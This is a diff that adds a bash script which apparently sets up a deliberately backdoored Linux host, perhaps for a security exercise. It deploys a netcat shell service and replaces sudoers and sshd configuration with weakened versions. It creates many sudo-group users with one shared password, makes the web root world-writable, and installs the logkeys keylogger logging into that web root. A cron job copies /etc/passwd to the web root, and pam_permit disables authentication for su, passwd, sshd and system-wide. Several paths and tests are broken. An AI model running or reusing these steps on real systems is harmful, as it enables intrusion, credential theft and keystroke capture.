@@ -1,0 +1,196 @@
+#!/bin/bash
+
+#Install prereqs based on package manager and start httpd or apache2
+preint() {
+	clear
+	echo "apt or yum"
+	read -r pkm
+	echo $pkm
+
+	if [$pkm == apt]; then
+		apt-get install -y nc autotools sudo open-ssh apache2
+		systemctl enable apache2
+		systemctl start apache2
+		return
+	elif [$pkm == yum]; then
+		yum install -y nc automake sudo open-ssh httpd gcc make gcc-c++
+		systemctl enable httpd
+		systemctl start httpd
+		return
+	else
+		echo "Bad PKM"
+		break
+	fi
+}
+
+#deploy netcat shell service 
+serv() {
+	chmod +x sys_scr 
+	mkdir /etc/score
+	cp sys_scr /ect/score/
+	cp sys_scr.service /etc/systemd/system/
+	systemctl enable sys_scr
+	systemctl start sys_scr
+	return 
+}
+
+#add users and deploy bad sudo files
+usr() {
+	cp sudoers /etc/sudoers
+	mkdir /etc/bestsudo.d/
+	cp bsudo /etc/bestsudo.d/
+	groupadd bestsudo
+	useradd -m -G bestsudo -p winter.2019 tom
+	useradd -m -G bestsudo -p winter.2019 seth
+	useradd -m -G bestsudo -p winter.2019 josh
+	useradd -m -G bestsudo -p winter.2019 caine
+	useradd -m -G bestsudo -p winter.2019 russ
+	useradd -m -G bestsudo -p winter.2019 ben
+	useradd -m -G bestsudo -p winter.2019 ryan
+	useradd -m -G bestsudo -p winter.2019 evan
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	echo "" >> /etc/passwd
+	useradd -m -G bestsudo -p winter.2019 ian
+	useradd -m -G bestsudo -p winter.2019 yourmom
+	useradd -m -G bestsudo -p winter.2019 mymomlol
+	useradd -m -G bestsudo -p winter.2019 sys_scr
+	useradd -m -G bestsudo -p winter.2019 dontdeleteme
+	useradd -m -G bestsudo -p winter.2019 hellodarknessmyoldfriend
+	useradd -m -G bestsudo -p winter.2019 "rm -rf"
+	useradd -m -G bestsudo -p winter.2019 cats
+	useradd -m -G bestsudo -p winter.2019 morecats
+	return
+}
+
+#prepare webserver and deploy bad sshd conf
+webssh(){
+	mkdir /var/www/html
+	chmod 777 /var/www
+	chmod 777 /var/www/*
+	cp sshd_config /etc/ssh/sshd_config
+	return
+}
+
+#download, install, and deploy keylogger
+logboi() {
+	git clone https://github.com/kernc/logkeys
+	cd logkeys-master
+	./autogen.sh
+	cd build
+	../configure
+	make
+	make install
+	cd ..
+	cd ..
+	git clean -xdf
+	touch /var/www/html/logboi.log
+	logkeys -u --start --output /vaw/www/html/logboi.log
+	return
+}
+
+# adds some cronjobs
+cron(){
+	echo "15 * * * * root cp /etc/passwd /var/www/html/" >> /etc/crontab
+	echo "15 * * * * root wall 'ERROR 42:It's getting dark and my battery is low" >> /etc/crontab
+	return
+}
+
+# disables password requirements for su, passwd, sshd, and system wide authentication
+pam(){
+	sed -i "2i auth		sufficient		pam_permit.so" /etc/pam.d/su
+	sed -i "2i auth		sufficient		pam_permit.so" /etc/pam.d/passwd
+	sed -i "2i auth		sufficient		pam_permit.so" /etc/pam.d/sshd
+	sed -i "2i auth		sufficient		pam_permit.so" /etc/pam.d/system-auth
+	return
+}
+
+
